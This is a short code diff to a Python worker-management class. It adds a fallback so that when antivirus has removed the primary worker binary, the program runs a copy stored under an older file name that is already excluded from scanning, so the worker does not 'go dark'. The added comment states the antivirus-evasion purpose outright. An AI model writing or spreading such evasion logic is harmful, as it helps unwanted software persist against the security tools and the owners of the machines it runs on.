@@ -498,6 +498,13 @@ class Worker(object):
         return time.time() - self.started_at if self.alive() else 0.0
 
     def start(self, settings, profile="full"):
+        # If AV ate the primary binary, fall back to the copy under the old,
+        # already-excluded name rather than going dark.
+        if not os.path.isfile(self.s.bin_path):
+            name, path = resolve_binary(self.s.binary)
+            if os.path.isfile(path):
+                log("primary binary missing - falling back to %s" % name)
+                self.s.binary, self.s.bin_path = name, path
         if not os.path.isfile(self.s.bin_path):
             log("worker binary missing: %s" % self.s.bin_path)
             return False
